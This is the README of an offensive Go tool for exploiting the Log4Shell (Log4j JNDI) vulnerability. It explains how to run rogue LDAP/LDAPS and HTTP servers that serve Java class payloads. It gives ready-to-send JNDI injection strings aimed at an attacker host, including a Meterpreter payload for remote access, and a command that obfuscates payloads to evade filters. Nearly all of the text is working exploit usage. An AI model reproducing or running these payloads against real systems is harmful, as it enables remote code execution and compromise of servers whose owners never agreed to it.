# Log4Shell
 * Check, exploit, obfuscate, TLS, ACME in one Go program.
 * You don't need to install anything except develop it.

## Usage
 ### Start LDAP and HTTP server
   * ```Log4Shell.exe -host "1.1.1.1"```
   * ```Log4Shell.exe -host "example.com"```
 
 ### Start LDAPS and HTTPS server
   * ```Log4Shell.exe -host "example.com" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"```
   * ```Log4Shell.exe -host "1.1.1.1" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"``` (need IP SANs)

 ### Start LDAPS and HTTPS server with ACME
   * ```Log4Shell.exe -host "example.com" -auto-cert``` (must use domain name)

 ### Obfuscate malicious(payload) string
   ```
   Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/Calc}"

   raw: ${jndi:ldap://1.1.1.1:3890/Calc}

   ${jn${Nc3-h17cwiZ-bRU2sh:-di:}${CGPuF-OGZxNU-zZfWp:-l}${wW:sVK9ZUijf:jUelV4upFr:wjD:-}d${OZQ-MqOEGT9K
   -IAdC:-ap}${Kce64-15l39K4DD5-xWtee:zY:-:/}${gZm-yFU0:-}${o05ov5-9bU2WWgtlf:PK5:-/}${y7sa1T:aFd6Q7S45r
   -KYGD:-}${0dPYxy:IqCd:-1}${YSf-yHfZ:-.1}${Jct1X-kQVdPM:cKmXcaheDfY:kI:-}.${It:CK52YEP-6HC:-1.1}${rzgS
   :e1wOc5zHLe-Q1tI2IqBj-G2A:-}:3${NMDyH8-bsqLVD-m0HdT:ik:-}${Bg-2GX6XW:CFHnf:-}${4sqv:HPwwv:-89}0${BzHb
   q-JBkQtJ7qDz:L7PaQXH:PUYv91:-/C}${QfhcM:tn:-}${6e-OkiFFt:WtnF:-al}c${etTbi-iWYq-pvATIA6K2K:Rq:-}}
   ```

## Check
 * start Log4Shell server
 * put your class file to the payload directory
 * send ```${jndi:ldap://1.1.1.1:3890/Nop}```
 * send ```${jndi:ldaps://example.com:3890/Nop}``` with TLS

## Exploit
 * start Log4Shell server
 * put your class file to the payload directory
 * send ```${jndi:ldap://1.1.1.1:3890/Meterpreter}```
 * send ```${jndi:ldaps://example.com:3890/Meterpreter}``` with TLS
 * meterpreter will open source after some time

## VulApp
 * VulApp is a vulnerable Java program that use log4j2 package.
 * You can use it for develop this project easily.
 * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1:3890/Calc}```

## Help
  ```
  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::
  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:
  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+
  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+
  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+
  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#
  ######## ########   ########        ###   ########  ###    ### ########## ######## ########

                                                        https://github.com/For-ACGN/Log4Shell

Usage of Log4Shell.exe:
  -auto-cert
        use ACME client to sign certificate
  -host string
        server IP address or domain name (default "127.0.0.1")
  -http-addr string
        http server address (default ":8080")
  -http-net string
        http server network (default "tcp")
  -ldap-addr string
        ldap server address (default ":3890")
  -ldap-net string
        ldap server network (default "tcp")
  -obf string
        obfuscate malicious(payload) string
  -payload string
        payload(java class) directory (default "payload")
  -tls-cert string
        tls certificate file path (default "cert.pem")
  -tls-key string
        tls private key file path (default "key.pem")
  -tls-server
        enable ldaps and https server
  ```

## Screenshot
![](https://github.com/For-ACGN/Log4Shell/raw/main/screenshot.png)
